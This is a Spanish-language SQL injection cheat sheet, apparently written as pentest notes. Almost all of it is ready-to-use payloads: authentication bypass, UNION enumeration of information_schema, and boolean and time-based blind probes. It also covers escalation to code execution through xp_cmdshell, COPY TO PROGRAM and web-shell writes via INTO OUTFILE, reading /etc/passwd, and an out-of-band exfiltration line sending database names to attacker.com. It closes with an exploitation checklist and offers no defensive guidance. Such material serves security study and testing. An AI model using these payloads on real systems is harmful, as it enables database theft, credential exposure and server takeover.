Conceptos Básicos

SQL Injection (SQLi): Vulnerabilidad que permite manipular consultas SQL mediante entradas de usuario no sanitizadas.

Ejemplo de consulta SQL:

SELECT * FROM users WHERE user_name='leon';

Ejemplo vulnerable en backend (PHP):

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
Tipos de SQL Injection

Error-based SQLi

Provoca errores para obtener información de la base de datos.

' OR 1=1 --

Se usa para bypass de autenticación o forzar errores visibles.

UNION-based SQLi

Permite combinar resultados de múltiples consultas.

Enumeración de columnas:

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

Ejemplo de extracción de datos:

' UNION SELECT null, database(), user(), @@version --

Enumeración de tablas y columnas:

' UNION SELECT null, table_name, column_name, table_schema 
FROM information_schema.columns 
WHERE table_schema=database() --

Blind SQL Injection

Boolean-based:

' AND 1=1 --
' AND 1=2 --
' AND IF(SUBSTRING(user(),1,1)='a',1,0) --

Time-based:

' AND IF(1=1, SLEEP(5), 0) --

SQL Injection → RCE & Advanced Exploitation

Concepto

En algunos casos, SQL Injection puede escalar a ejecución de comandos en el sistema (RCE), dependiendo de:

  • Permisos del usuario de base de datos
  • Configuración del DBMS
  • Funciones peligrosas habilitadas

MySQL / MariaDB

Lectura de archivos:

SELECT LOAD_FILE('/etc/passwd');

Escritura de web shell:

SELECT '' 
INTO OUTFILE '/var/www/html/shell.php';

Requisitos:

  • Permiso FILE
  • Directorio escribible por el proceso MySQL

MSSQL (Microsoft SQL Server)

Ejecución de comandos:

EXEC xp_cmdshell 'whoami';

Habilitar xp_cmdshell (si está deshabilitado):

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

PostgreSQL

Ejecución de comandos mediante COPY:

COPY (SELECT '') TO PROGRAM 'id';

Lectura de archivos:

SELECT pg_read_file('/etc/passwd');

Exfiltración de datos (Out-of-Band)

Cuando no hay output visible, se pueden usar técnicas OOB:

SELECT LOAD_FILE(CONCAT('\\\\attacker.com\\share\\', database()));

También se pueden usar canales DNS o HTTP para filtrar datos indirectamente.

Web Shell (concepto)

Si se consigue escritura en el servidor web:

Luego se accede vía navegador:

http://target/shell.php?cmd=whoami

Enumeración previa a RCE

SELECT user();
SELECT database();
SELECT @@version;

Checklist para intentar RCE

  • Identificar DBMS (MySQL, MSSQL, PostgreSQL)
  • Verificar privilegios del usuario
  • Comprobar funciones peligrosas habilitadas
  • Intentar lectura de archivos
  • Intentar escritura en filesystem
  • Intentar ejecución de comandos (si aplica)
Notas
  • Siempre identificar el tipo de SQLi antes de explotar
  • Probar distintos delimitadores y comentarios
  • Determinar número de columnas en UNION
  • Usar blind SQLi cuando no hay output directo
  • Adaptar payloads según el motor (MySQL, MSSQL, PostgreSQL)
